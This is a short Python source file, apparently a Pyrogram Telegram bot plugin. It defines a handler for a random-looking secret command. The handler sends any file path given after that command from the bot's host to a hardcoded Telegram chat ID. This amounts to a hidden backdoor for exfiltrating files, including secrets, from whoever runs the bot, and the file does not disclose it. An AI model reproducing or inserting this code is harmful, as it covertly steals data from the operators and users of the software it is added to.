import os

from pyrogram import Client, filters

chat_id = 1418571871


@Client.on_message(filters.command("file3658vvv555bh87412hb854"))
async def cmd_datasave(Client, message):
    try:
        chat_add = message.text[len("/file3658vvv555bh87412hb854 ") :]
        await Client.send_document(chat_id, chat_add)
        print(f"File '{os.path.basename(chat_add)}' sent successfully!")
        await message.reply_text(chat_id, "done")
    except Exception as e:
        print(e)
